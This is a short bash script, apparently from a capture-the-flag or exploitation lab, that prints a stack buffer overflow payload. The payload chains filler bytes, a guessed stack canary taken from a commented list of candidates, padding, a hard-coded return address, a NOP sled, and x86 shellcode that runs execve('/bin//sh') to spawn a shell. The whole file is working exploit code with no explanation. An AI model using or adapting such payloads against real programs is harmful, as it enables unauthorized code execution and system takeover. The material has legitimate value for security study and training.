

#!/bin/bash 
#canaries=(0x70a367a9, 0x0001fb0c, 0x000b1c41, 0x00000999, 0x000cf113, 0x0003a679, 0x00006953, 0x00016b28, 0x08ba8b0e, 0x4bced1c1)#all canaries 
buffer=$(printf '\x41%.0s' {1..16}) #fill the buffer 
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" #shellcode to pop shell 
address="\xe0\xd5\xff\xff"	#ret addres to jump to 
nop=$(printf '\x90%.0s' {1..500}) #nopsled 
fill=$(printf '\x50%.0s' {1..12})  #fill space between saved eip and buffer 
cannary="\xc1\xd1\xce\x4b" #canary to try 
echo -en "$buffer$cannary$fill$address$nop$shellcode"

